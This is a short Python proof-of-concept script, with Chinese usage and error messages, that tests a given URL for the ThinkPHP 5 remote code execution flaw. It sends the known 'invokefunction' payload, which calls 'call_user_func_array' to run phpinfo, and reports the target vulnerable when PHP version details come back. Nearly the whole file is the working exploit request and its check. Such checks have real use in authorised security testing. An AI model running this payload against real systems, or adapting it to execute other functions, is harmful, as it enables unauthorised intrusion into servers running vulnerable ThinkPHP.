# coding=utf-8
#from lib.Requests import Requests
import requests

print("用法：http://example.com/{index.php}不需要index.php")
def check(**kwargs):
    url = kwargs['url']
    #req = Requests()
    payload = r"/index.php/?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    try:
        r = requests.get(url + payload, verify=False)
        if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
            print('thinkphp5_rce_1 | ' + url)
            return 1
        else:
            print('target is not vulnerable')
            return
    except Exception as e:
        print("异常对象的内容是%s"%e)
